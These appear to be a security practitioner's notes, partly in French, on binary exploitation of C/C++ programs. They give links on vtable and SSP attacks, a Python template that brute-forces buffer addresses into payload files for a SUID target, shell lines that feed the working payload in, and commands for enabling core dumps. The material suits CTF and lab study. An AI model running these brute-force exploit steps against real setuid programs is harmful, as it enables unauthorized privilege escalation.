### C struct & C++ thiscall "hidden" pointer stored in EAX

#### Virtual functions

- https://wiki.zenk-security.com/doku.php?id=failles_app:bof#c_vtables
- https://alschwalm.com/blog/static/2016/12/17/reversing-c-virtual-functions/
- https://mohamed-fakroud.gitbook.io/red-teamings-dojo/c++/polymorphism-and-virtual-function-reversal-in-c++

#### Smart pointers

- https://ptr-yudai.hatenablog.com/entry/2021/11/30/235732

### Bruteforce (with or without ASLR due to env. variables; or unknown buffer address)

*NB*: Les programmes SUID peuvent disposer d'un environment différent: strace, GDB, programme seul => addresses différentes

```py
#exploit.py
import struct,sys

# &buffer_GDB or &payload_GDB
address = 0xbffffaa9-0x01*100

i = 0
while (i<1100):
    address += 0x01  # incrémente VTABLE1

    payload  = "..."
    payload += struct.pack("<I", address)        
    #...
    payload += struct.pack("<I", address + X)    

    # shellcode
    with open(f"""payload-{i}""","wb") as f:
        f.write(payload)
        i+=1

```

```bash
python3 exploit.py
for e in $(ls payload*); do $(cat $e | ~/vuln) && echo $e ;done

# working payload-Y file outputted

(cat payload-Y; cat) | ~/vuln
```

### Bruteforce SSP

- https://0xswitch.fr/posts/leak-via-stack-smashing-protection
- https://www.dailysecurity.fr/la-stack-smashing-protection/

### Core files (BF alternative)

- https://codelucky.com/core-dump-linux/
- https://unix.stackexchange.com/questions/89933/how-to-view-core-files-for-debugging-purposes-in-linux

```bash
ulimit -c unlimited; echo 'core' | sudo tee /proc/sys/kernel/core_pattern
mkdir /tmp/night
cp * /tmp/night
chmod -R 777 /tmp/night
cd /tmp/night
./binary 
```

Core generated:

```bash
gdb -q ./binary ./core
gdb -c core -q
```
